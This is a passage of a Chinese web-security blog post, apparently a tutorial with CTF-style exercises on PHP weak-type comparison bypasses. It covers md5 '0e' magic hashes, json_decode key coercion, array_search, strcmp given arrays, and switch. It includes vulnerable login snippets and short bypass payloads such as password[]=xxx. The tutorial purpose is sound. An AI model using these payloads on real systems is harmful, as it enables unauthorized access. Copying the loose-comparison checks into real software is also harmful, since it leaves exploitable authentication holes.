+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>通过以上的知识我们也能明白为什么 &ldquo;admin1&rdquo;==1 =&gt;False 的原因，因为其会被转换成0而不是1， <!-- raw HTML omitted --></p>
+<p>而&quot;0e123456&quot;==&ldquo;0e4456789&quot;则是因为两边都是科学计数法，结果都为0 <!-- raw HTML omitted --></p>
+<h4 id="实例">实例</h4>
+<p>接下来我们跟着Mrsm1th师傅来看看几个实例加强一下印象 <!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>md5绕过(Hash比较缺陷)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$logined</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$Username</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">ctype_alpha</span><span class="p">(</span><span class="nv">$Username</span><span class="p">))</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="k">false</span><span class="p">;}</span> <span class="c1">// 检查$Username中的所有字符是否都是字母
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="k">false</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$Username</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="k">false</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="nv">$logined</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;successful&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">           <span class="k">echo</span> <span class="s2">&#34;login failed!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这里要求 <code>$Username</code> 为字母组成的字符串，要求 <code>$password</code> 为数字，同时要求他们的md5结果一致 <!-- raw HTML omitted --></p>
+<p>那么我们的目的，就是让两个md5后的值，用 != 比较，也就是在强制转换为数字之后再进行比较 <!-- raw HTML omitted --></p>
+<p>这里给出一组结果为&quot;0e&quot;开头的字符串，0e开头意味着会被当作是科学计数法来使用，并且结果都为0，自然也就都相等 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">QNKCDZO</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e830400451993494058024219903391</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">240610708</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e462097431906509019562988736854</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s878926199a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e545993274517709034328855841020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s155964671a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e342768416822451524974117254469</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s214587387a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e848240448830537924465865611904</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s214587387a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e848240448830537924465865611904</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s878926199a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e545993274517709034328855841020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1091221200a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e940624217856561557816327384675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1885207154a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e509367213418206700842008763514</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1502113478a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e861580163291561247404381396064</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1885207154a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e509367213418206700842008763514</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1836677006a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e481036490867661113260034900752</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s155964671a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e342768416822451524974117254469</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1184209335a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e072485820392773389523109082030</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1665632922a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e731198061491163073197128363787</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1502113478a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e861580163291561247404381396064</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1836677006a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e481036490867661113260034900752</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1091221200a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e940624217856561557816327384675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s155964671a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e342768416822451524974117254469</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1502113478a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e861580163291561247404381396064</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s155964671a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e342768416822451524974117254469</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1665632922a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e731198061491163073197128363787</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s155964671a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e342768416822451524974117254469</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1091221200a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e940624217856561557816327384675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1836677006a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e481036490867661113260034900752</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1885207154a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e509367213418206700842008763514</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s532378020a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e220463095855511507588041205815</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s878926199a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e545993274517709034328855841020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1091221200a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e940624217856561557816327384675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s214587387a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e848240448830537924465865611904</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1502113478a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e861580163291561247404381396064</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1091221200a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e940624217856561557816327384675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1665632922a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e731198061491163073197128363787</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1885207154a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e509367213418206700842008763514</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1836677006a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e481036490867661113260034900752</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s1665632922a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e731198061491163073197128363787</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">s878926199a</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0e545993274517709034328855841020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">来源：</span> <span class="nx">https</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">jianshu</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">p</span><span class="o">/</span><span class="nx">d3a9e7de0b12</span>
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>json绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span><span class="s2">&#34;*********&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$message</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;flag&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;fail&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">echo</span> <span class="s2">&#34;~~~~&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>在这个情况下 $key 的值我们不知道，无法给出准确的输入，但是却可以利用 0==&lsquo;admin&rsquo; 的形式来进行绕过，即我们输入0，使相等判断时的key的值被强制转换为0来进行绕过 <!-- raw HTML omitted --></p>
+<p>payload: message={&ldquo;key&rdquo;:0} <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>array_search is_array绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">])){</span><span class="k">exit</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;admin&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;error&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nv">$test</span><span class="p">)</span><span class="o">===</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;flag&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;false&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>脚本要求GET输入的值 <code>test</code> 是一个数组，并且数组中的每一个元素都不能等于 <code>admin</code> ，但是又要求在 <code>array_search</code> 的搜索中需要有 <code>admin</code> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">array_search</span><span class="p">(</span><span class="nx">mixed</span> <span class="nv">$needle</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$haystack</span><span class="p">,</span> <span class="nx">bool</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">int</span><span class="o">|</span><span class="nx">string</span><span class="o">|</span><span class="k">false</span>
+</span></span></code></pre></div><p>$needle代表查询的字符串，$haystack是被查询的数组，而 $strict 参数的设置也决定了是否能够进行绕过，即是否进行“===”比较，如果没有设置，那么如果我们的字符串中有0，在进行比较的时候就会使 $needle 被转换成为0来进行比较 <!-- raw HTML omitted --></p>
+<p>payload: test[]=0 进行绕过 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nv">$a</span><span class="p">));</span> <span class="c1">// int(0) =&gt; 返回键值0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">array_seach</span><span class="p">(</span><span class="s2">&#34;1admin&#34;</span><span class="p">,</span><span class="nv">$a</span><span class="p">));</span>  <span class="c1">// int(1) ==&gt;返回键值1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>strcmp漏洞绕过 php -v &lt;5.3</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span><span class="o">=</span><span class="s2">&#34;***************&#34;</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Right!!!login success&#34;</span><span class="p">;</span><span class="nx">n</span>
+</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Wrong password..&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们在上面的strcmp函数的绕过中也有过讲解，strcmp是用来比较两个字符串的长度，既然这里出现了&rdquo;== 0&quot; 那我们就应该想办法往弱类型比较绕过上去靠，那么当strcmp所接受的是数组的时候，将发生错误，并返回0 <!-- raw HTML omitted --></p>
+<p>payload: password[]=xxx <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>switch绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;4admin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;fail1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;fail2&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;fail3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;sucess&#34;</span><span class="p">;</span>  <span class="c1">//结果输出success;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;failall&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>switch本质上还是进行弱类型比较，我们可以用同样的方法进行绕过 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">php</a>
+        
+            <a href="/tags/web_security/">web_security</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Jun 26, 2022 23:56 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/php_bypass_query_string_parser/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">如何利用PHP查询字符串解释器来绕过IDPS以及WAF</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_serialize_unserialize/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 序列化与反序列化</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/mysql_tricks/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mysql中的“奇技淫巧”</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/sql_injection_file_rw/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：文件读写</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_unserialize_examples/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化实例练习</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
